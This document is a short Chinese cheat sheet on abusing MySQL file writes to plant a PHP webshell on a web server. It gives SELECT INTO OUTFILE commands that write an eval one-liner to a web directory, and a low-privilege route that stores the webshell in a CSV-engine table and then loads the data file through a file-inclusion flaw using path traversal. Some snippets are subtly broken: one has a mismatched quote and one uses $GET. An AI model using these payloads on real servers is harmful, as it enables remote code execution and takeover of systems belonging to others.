# mysql写文件

## 任意路径(outfile和dumpfile可用的情况下)

`select into` + 

- `outfile`可以写入多行，可输出终止符和换行格式，常用与脱库

- `dumpfile`只可写一行，并且输出中不存在任何格式，导入二进制文件不会因换行符导致文件被破坏，所以常用于写入软件 _udf提权_

### demo

```
  select "<?php eval($_REQUEST[8])?>" into outfile '../../../../php/a.php";
```

- `select 123 into outfile './1.txt'`

## 固定路径(低权限时方案)

> 利用mysql建表插入数据权限写入一句话木马，前提是等登录...爆破不出密码就尝试找其他文件上传漏洞吧

> 以下命令在mysql命令行环境中执行

### 查询数据库数据存储路径

```
select @@datadir
```

结果如：`D:\MySQL\data\`

### 选择数据库

- 查看数据库列表`select databases;`
- 选中有权限的数据库`use 数据库名`

### 创建表，将一句话木马作为字段名写入

```sql
create table if not exists `t`(`a` varchar(255) not null)engine=csv;
insert into t value('<?php eval($GET[8]);?>')
```

最后需要找到可控的引入点，将`D:\MySQL\data\数据库名\t.CSV`引入

绝对路径行不通的话可以尝试下相对路径`asdjfasdasdf/../../../../../../../../MySQL/data/数据库名/t.CSV`